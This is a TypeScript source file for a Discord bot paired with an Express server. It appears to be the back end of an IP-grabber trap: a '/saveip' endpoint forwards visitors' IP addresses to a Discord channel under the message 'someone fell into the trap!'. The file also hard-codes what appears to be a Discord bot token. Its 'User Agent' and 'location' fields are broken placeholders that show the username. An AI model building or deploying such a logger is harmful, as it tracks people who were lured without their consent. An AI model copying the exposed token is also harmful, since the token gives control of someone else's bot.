import { REST } from "@discordjs/rest";
import { WebSocketManager } from "@discordjs/ws";
import {
  GatewayDispatchEvents,
  GatewayIntentBits,
  InteractionType,
  Client,
  ChannelsAPI,
} from "@discordjs/core";
import express from "express";
import cors from "cors";

const token =
  "MTEyOTA3NDY1NzU5Nzg3MDIwMg.GbSQdh.XJbKdQBWNUTkwkCmtlqotJ7ZotfVSGWpKh16Kk";

// Create REST and WebSocket managers directly
const rest = new REST({ version: "10" }).setToken(token);

const gateway = new WebSocketManager({
  token,
  intents: GatewayIntentBits.GuildMessages | GatewayIntentBits.MessageContent,
  rest,
});

// Create a client to emit relevant events.
const client = new Client({ rest, gateway });

const channelAPI: ChannelsAPI = new ChannelsAPI(rest);

// Listen for interactions
// Each event contains an `api` prop along with the event data that allows you to interface with the Discord REST API
client.on(
  GatewayDispatchEvents.InteractionCreate,
  async ({ data: interaction, api }) => {
    if (interaction.type !== InteractionType.ApplicationCommand) {
      return;
    }
    switch (interaction.data.name) {
      case "ping": {
        if (!interaction.member) {
          return;
        }
        await api.interactions.reply(interaction.id, interaction.token, {
          embeds: [
            {
              title: "Quelqu'un est tombé dans le piège !",
              thumbnail: {
                url: `https://cdn.discordapp.com/avatars/${interaction.member.user.id}/${interaction.member.user.avatar}.png`,
              },
              fields: [
                {
                  name: "Discord tag",
                  value: `<@${interaction.member.user.id}>`,
                  inline: true,
                },
                {
                  name: "Username",
                  value: interaction.member.user.username ?? "Aucun",
                  inline: true,
                },
                {
                  name: "IP Address",
                  value: interaction.member.user.username ?? "Aucun",
                  inline: true,
                },
                {
                  name: "User Agent",
                  value: interaction.member.user.username ?? "Aucun",
                  inline: true,
                },
                {
                  name: "Aproximative location",
                  value: interaction.member.user.username ?? "Aucun",
                  inline: true,
                },
              ],
            },
          ],
        });
        break;
      }
    }
  },
);

// API

const app = express();
const port = 80;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

app.post("/saveip", (req, res) => {
  const ip = req.body.ip;
  console.log(ip);
  if (!ip) {
    return res.sendStatus(400);
  }
  channelAPI.createMessage("1129100204436627496", {
    embeds: [
      {
        title: "Quelqu'un est tombé dans le piège !",

        fields: [
          {
            name: "IP Address",
            value: ip,
            inline: true,
          },
        ],
      },
    ],
  });
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`HTTP API Ready at http://localhost:${port}`);
});

// Listen for the ready event
client.once(GatewayDispatchEvents.Ready, () =>
  console.log("Discord bot Ready!"),
);
// Start the WebSocket connection.
gateway.connect();
